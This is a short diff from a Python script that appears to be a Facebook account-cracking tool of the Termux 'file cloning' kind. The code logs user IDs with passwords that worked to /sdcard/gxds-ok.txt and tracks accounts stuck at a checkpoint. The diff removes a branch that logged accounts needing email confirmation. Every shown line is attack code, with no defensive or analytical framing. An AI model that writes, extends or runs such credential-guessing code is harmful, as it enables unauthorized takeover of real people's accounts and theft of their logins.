@@ -289,10 +289,6 @@ def file_subb(uid,pwx):
                 open("/sdcard/gxds-ok.txt","a").write(uid+"|"+ps+"\n")
                 oks.append(uid)
                 break
-            elif "Please Confirm Email" in q:
-                print(f"\r\r{lgr} [GXDS-CE] {uid}|{ps}")
-                open("/sdcard/gxds-ce.txt","a").write(uid+"|"+ps+"\n")
-                oks.append(uid)
             elif "www.facebook.com" in q['error']['message']:
                 print(f"\r\r{lr}  [GXDS-CP] {uid}|{ps}")
                 cps.append(uid)
